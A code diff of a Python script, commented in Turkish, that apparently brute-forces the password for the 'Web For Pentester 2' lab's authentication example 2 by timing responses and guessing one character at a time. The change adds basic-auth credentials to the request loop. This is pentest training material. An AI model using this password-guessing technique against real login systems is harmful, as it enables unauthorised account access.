@@ -1,6 +1,7 @@
 # author: Gökmen DEMİR
 # Web For Pentester 2 Authentication Exp2 için
-# 1. ve 3. print satırlarını silebilirsiniz.
+# 1. ve 3. print satırları silinebilir.
+# v1.1
 import requests
 referansList = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 url = "http://192.168.126.130/authentication/example2/"
@@ -21,6 +22,6 @@ while sonsuz:
         cennetinKapisi[g] = tempString
     print(cennetinKapisi)
     sinirZamani += 0.2
-    r = requests.get(url)
+    r = requests.get(url, auth=('hacker', tempString))
     if r.ok:
         sonsuz = 0
